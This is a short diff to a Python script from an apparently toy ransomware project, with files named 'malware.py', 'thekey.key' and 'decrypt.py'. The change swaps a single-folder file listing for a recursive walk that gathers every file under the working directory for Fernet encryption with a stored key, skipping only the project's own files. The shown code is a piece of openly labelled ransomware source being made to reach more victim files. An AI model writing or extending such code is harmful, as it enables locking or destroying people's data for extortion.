@@ -2,11 +2,16 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
-for file in os.listdir():
-    if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitingore', 'requirements.txt'):
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+def add_files_by_dir(path: str='.'):
+    for file in os.listdir(path):
+        if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitignore', 'requirements.txt', '.git', '.venv'):
+            continue
+        if os.path.isfile(os.path.join(path, file)):
+            files.append(os.path.join(path, file))
+        else:
+            add_files_by_dir(os.path.join(path, file))
+
+add_files_by_dir()
 
 with open('thekey.key', 'rb') as thekey:
     secretkey = thekey.read()
